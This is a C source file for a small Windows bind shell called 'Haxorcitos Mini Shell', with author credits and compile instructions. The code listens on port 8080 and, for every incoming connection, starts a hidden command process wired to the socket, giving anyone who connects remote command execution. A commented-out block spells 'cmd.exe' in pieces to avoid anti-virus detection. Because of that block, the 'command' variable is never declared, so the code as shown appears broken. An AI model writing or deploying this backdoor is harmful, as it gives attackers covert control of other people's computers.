/*##############################################################################
                           Haxorcitos Mini Shell
           =======================================================
 
Details: 
 
Compiled Size: 908 bytes
Tweaked Size : 804 bytes (with a little Headers modification by Tarako)
This size can be also reduced disabling MsDos exe compatibility (maybe further release)
 
Programado por/Coded by : Miguel Tarasc� Acu�a aka "Tarako" - Tarako@gmail.com
Programado por/Coded by : Andres Tarasc� Acu�a aka "aT4r" - atarasco@gmail.com
 
Pagina Web/ Web page    : http://www.Haxorcitos.com
 
Tested under Windows 2000 SP4 Spanish version
Tested under Windows XP   SP2 Spanish version
 
Sorry Checksum.org. Our bind shell is smaller than yours (tx.exe)  }:)
and we also provide source code

Revised by Xinwen Fu

Compile on windows: gcc.exe nice3.c -o nice3.exe -lws2_32
 
################################################################################*/
#include <winsock2.h>
#include <stdio.h>
//#pragma comment(linker,"/ENTRY:WinMain")
 
//int WINAPI WinMain(HINSTANCE ,  HINSTANCE , LPSTR ,int ) {
int main(int argc,char **argv){
	STARTUPINFO          si;
	struct               sockaddr_in sa;
	PROCESS_INFORMATION  pi;
	int s_s, s;
	WSADATA              HWSAdata;

	// ShowWindow(GetConsoleWindow(), SW_HIDE);

	WSAStartup(0x101, &HWSAdata); 
	
	s_s=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0);
	sa.sin_family     = AF_INET;
	sa.sin_port       = 0x901F; // (USHORT)htons(8080);
	sa.sin_addr.s_addr= 0x00;   // htonl(INADDR_ANY);
	
	bind(s_s, (struct sockaddr *) &sa, 16);
	listen(s_s, 1);
	
	/*
	// Avoid detection by anti-virus
	char *myArray[4] = { "cm", "d.e", "x", "e" };
	char command[8] = "";
	snprintf( command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]);
	*/
	
	while (1) {
		s= accept(s_s,(struct sockaddr *)&sa,NULL);
		
		si.cb          = sizeof(si);  // 0x44;     
		si.wShowWindow = SW_HIDE;     // 0x00
		si.dwFlags     = STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES; // 0x101
		si.hStdInput   = si.hStdOutput = si.hStdError = (void *) s;   
		
		si.lpDesktop = si.lpTitle = (char *) 0x0000;
		si.lpReserved2 = NULL;
		
		
		CreateProcess(NULL,
		command,
		NULL, 
		NULL,
		TRUE, 
		0,
		NULL,
		NULL,
		(STARTUPINFO*)&si,
		&pi);
	}
}
